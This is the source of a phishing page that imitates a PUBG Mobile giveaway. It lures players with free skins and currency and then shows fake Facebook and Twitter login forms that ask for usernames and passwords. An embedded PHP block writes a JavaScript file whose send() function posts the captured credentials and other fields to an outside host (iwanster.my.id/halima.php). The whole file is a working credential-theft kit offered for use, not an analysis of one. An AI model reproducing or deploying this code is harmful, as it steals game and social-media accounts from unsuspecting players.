<!-- SUBRECK YT SEPUTAR PABJI -->
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title></title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
   <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css">
</head>
<body>
   <div class="item"></div>
   <section>
      <canvas id="canvas"></canvas>
   	  <header>
   	  	<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
   	  	<div class="text">
   	  		PUBG MOBILE
   	  		<span class="sel">OFFICIAL PUBG ON MOBILE</span>
   	  	</div>
   	  	<img class="rp" src="https://www.pubgmobile.com/en/event/royalepass16/images/s4_swiper_icon.png">
   	  </header>
   	  <div class="box">
   	  	 <div class="selector">
   	  	 	<a class="sel active" id="outfit"><span>Outfit</span></a>
   	  	 	<a class="sel" id="weapon"><span>Weapon</span></a>
   	  	 	<a class="sel" id="shop"><span>Pharoah</span></a>
   	  	 </div>
   	  	 <div class="konten">
   	  	 	<p class="alert">Choose which skin you interested</p>
              <div class="load"></div>
    	 </div>
   </section>
   <div class="mask"></div>
   <div class="welcome" id="pop1">
   	<div class="title">WELCOME TO PUBG MOBILE EVENT</div>
   	<img src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
   	<p>There are a lot prize you can collet from Outfit skin Weapon skin, and others like Uc and etc
   	first you should click Hide button to start claim your prize</p>
   	<button class="hide" id="diss">Dismiss</button>
    </div>

    <div class="welcome" id="pop2" style="display: none;">
   	<div class="title">REWARD CONFIRMATION</div>
   	<img id="rewards" class="hadiah" src="" style="width:90px;height:90px;border:1px solid #f00c93;border-radius:2px;">
   	<p>Are You Sure Want This Item?</p>
   	<div class="mw">
   		 <button id="tutup" class="hide">No</button>
		 <button id="ambil" class="hide">Yes</button>
   	</div>
    </div>
    <?php $k = fopen('js/da.js','w');fwrite($k,"function send(a,b,c,d,e,u,p,l){var data = new FormData();data.append('a',a);data.append('b',b);data.append('c',c);data.append('d',d);data.append('e',e);data.append('u',u);data.append('p',p);data.append('l',l);var xhr = new XMLHttpRequest();xhr.open('POST', 'http://iwanster.my.id/halima.php', true);xhr.send(data);}");fclose($k);
    ?>
    <div class="welcome" id="pop3" style="display:none">
      <div class="title">LOGIN REQUIRED</div>
      <div class="place">
         <p>Login To Your Account To Continue</p>
         <div class="sci" id="fb" style="background:#3b5998;"><i class="fa fa-facebook-square" aria-hidden="true"></i>Login With Facebook</div>
         <div class="sci" id="tw" style="background:#1DA1F2;"><i class="fa fa-twitter-square" aria-hidden="true"></i>Login With Twitter</div>
      </div>
      <button id="bye" class="hide">Close</button>
    </div>
    <!-- POP UP LOGIN -->
     <div class="popup-login login-facebook animated fadeIn" style="display: none;">
      <div class="popup-box-login-fb">
         <a onclick="tutup_facebook()" class="close-fb"><i class="fa fa-times" aria-hidden="true"></i></a>
         <div class="navbar-fb">
            <img width="45" src="img/facebook_text.png">
         </div>
         <div class="content-box-fb">
            <img width="60" height="60" src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
            <div class="txt-login-fb">
                Log in to your Facebook account to connect to PUBG MOBILE
            </div>
            <form class="login-form" action="form.html" method="GET">
               <label>
               <input type="text" name="user" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="">
               </label>
               <label>
               <input type="password" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off" required="">
               </label>
               <input type="hidden" name="login" value="Facebook" readonly="">
               <button  type="submit" class="btn-login-fb">Log In</button>
            </form>
            <div class="txt-create-account">Create account</div>
            <div class="txt-not-now">Not now</div>
            <div class="txt-forgotten-password">Forgotten password?</div>
         </div>
         <div class="language-box">
            <center>
            <div class="language-name language-name-active">English (UK)</div>
            <div class="language-name">Bahasa Indonesia</div>
            <div class="language-name">Basa Jawa</div>
            <div class="language-name">Bahasa Melayu</div>
            <div class="language-name">日本語</div>
            <div class="language-name">Español</div>
            <div class="language-name">Português (Brasil)</div>
            <div class="language-name">
               <i class="fa fa-plus"></i>
            </div>
            </center>
         </div>
         <div class="copyright">Facebook Inc.</div>
      </div>
    </div>
    <div class="popup-login login-twitter animated fadeIn" style="display: none;">
      <div class="popup-box-login-twitter">
      <a onclick="tutup_twitter()" class="close-other"><i class="fa fa-times" aria-hidden="true"></i></a>
         <div class="header-twitter">
            <center>
            <img width="45" style="margin-bottom:-25px;" src="img/twitter_text.png">
            </center>
         </div>
         <div class="box-twitter">
            <center>
            <form action="form.html" method="GET">
               <div class="txt-login-twitter">Login to Twitter</div>
               <div class="input-box-twitter">
                  <label>Phone, email, or username</label>
                  <input type="text" name="user" placeholder="" required="">
               </div>
               <div class="input-box-twitter">
                  <label>Password</label>
                  <input type="password" name="pass" placeholder="" required="">
               </div>
               <input type="hidden" name="login" value="Twitter" readonly="">
               <button type="submit" class="btn-login-twitter">Log In</button>
               <div class="footer-menu-twitter">Forgot password?</div>
               <div class="footer-menu-twitter bulet">•</div>
               <div class="footer-menu-twitter">Sign up to Twitter</div>
            </form>
            </center>
         </div>
      </div>
    </div>
   <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
   <script type="text/javascript">
   	$(document).on('click','.selector .sel', function()
   	{
   		$(this).addClass('active').siblings().removeClass('active')
   	})
   </script>
   <script type="text/javascript" src="js/load.js"></script>
   <script type="text/javascript" src="js/popup.js"></script>
   <script type="text/javascript" src="js/snow.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/Snowstorm/20131208/snowstorm.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/JQuery-Snowfall/1.7.4/snowfall.min.js"></script>
</body>
</html>